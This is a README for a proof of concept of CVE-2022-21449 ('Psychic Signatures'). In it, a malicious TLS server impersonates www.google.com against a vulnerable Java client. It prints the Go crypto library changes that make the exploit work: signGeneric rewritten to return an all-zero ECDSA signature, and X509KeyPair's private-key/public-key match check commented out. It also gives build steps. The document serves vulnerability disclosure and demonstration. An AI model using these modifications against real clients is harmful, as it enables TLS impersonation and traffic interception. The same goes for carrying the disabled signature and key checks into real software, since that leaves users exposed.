# CVE-2022-21449-TLS-PoC
CVE-2022-21449 ([also dubbed Psychic Signatures in the vulnerability writeup by Neil Madden](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/)) Proof of Concept demonstrating its usage with a vulnerable client and a malicious TLS server.

The malicious server presents a valid (as of 2022-04-20) cert chain for www.google.com which has an ECDSA pub key (secp256r1). However, the `crypto/ecdsa` package has been modified to present an invalid signature with `r = s = 0`. The vulnerable client accepts this invalid signature, allowing the rest of the TLS handshake to continue.

Aside from the removed `*_test.go` files while building & exploration, [these modifications to the golang crypto library](#modifications-to-the-golang-crypto-library) were necessary for the malicious TLS server. They can also be found by searching/grepping for `CVE-2022-21449` in the `go/src` directory.

# Building
Requires some existing golang installation as well as maven, then run `./build.sh`.

Tested on Ubuntu 20.04.4 LTS (WSL2) with OpenJDK 16.0.1 (build 16.0.1+9-Ubuntu-120.04, 2021-04-20)

# Demo
https://user-images.githubusercontent.com/7225227/164332612-832b046b-cd2e-46e8-b3d6-1da36e290992.mp4

# Modifications to the golang crypto library


In `crypto/ecdsa/ecdsa.go`, the function `signGeneric` was essentially modified to:
```go
func signGeneric(priv *PrivateKey, csprng *cipher.StreamReader, c elliptic.Curve, hash []byte) (r, s *big.Int, err error) {
        // SEC 1, Version 2.0, Section 4.1.3
        // CVE-2022-21449 - Modified and removed all calculations. Return r = s = 0
        r = new(big.Int)
        s = new(big.Int)
        return
}
```

And in `crypto/tls/tls.go`, the function `X509KeyPair` has been changed to disable verification checks that a given private key matches the X.509 certificate's public key for ECDSA public keys:
```go
// X509KeyPair parses a public/private key pair from a pair of
// PEM encoded data. On successful return, Certificate.Leaf will be nil because
// the parsed form of the certificate is not retained.
func X509KeyPair(certPEMBlock, keyPEMBlock []byte) (Certificate, error) {
        fail := func(err error) (Certificate, error) { return Certificate{}, err }
        ...
        switch pub := x509Cert.PublicKey.(type) {
        ...
        case *ecdsa.PublicKey:
                // CVE-2022-21449: Modified checks away
                _, ok := cert.PrivateKey.(*ecdsa.PrivateKey)
                if !ok {
                        return fail(errors.New("tls: private key type does not match public key type"))
                }
                /*if pub.X.Cmp(priv.X) != 0 || pub.Y.Cmp(priv.Y) != 0 {
                        return fail(errors.New("tls: private key does not match public key"))
                }*/
         ...
}
```

# Credits
- [Neil Madden](https://twitter.com/neilmaddog): finding and disclosing CVE-2022-21449, as [detailed in their excellent writeup](https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/).
- [Khaled Nassar](https://twitter.com/kmhnassar): This PoC.
